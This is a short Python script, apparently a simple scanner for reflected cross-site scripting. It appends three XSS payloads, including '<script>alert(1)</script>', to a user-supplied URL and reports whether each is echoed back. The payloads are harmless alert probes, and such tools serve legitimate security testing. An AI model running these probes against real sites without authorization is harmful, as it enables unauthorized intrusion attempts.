import requests

# List of XSS payloads
payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'><script>alert(1)</script>"
]

# Input URL
url = input("Enter URL (with parameter, e.g. http://test.com/?q=): ")

print("\nTesting for XSS...\n")

for payload in payloads:
    target_url = url + payload
    
    try:
        response = requests.get(target_url)
        
        if payload in response.text:
            print(f"[VULNERABLE] Payload reflected: {payload}")
        else:
            print(f"[SAFE] Payload not reflected: {payload}")
    
    except Exception as e:
        print(f"Error: {e}")
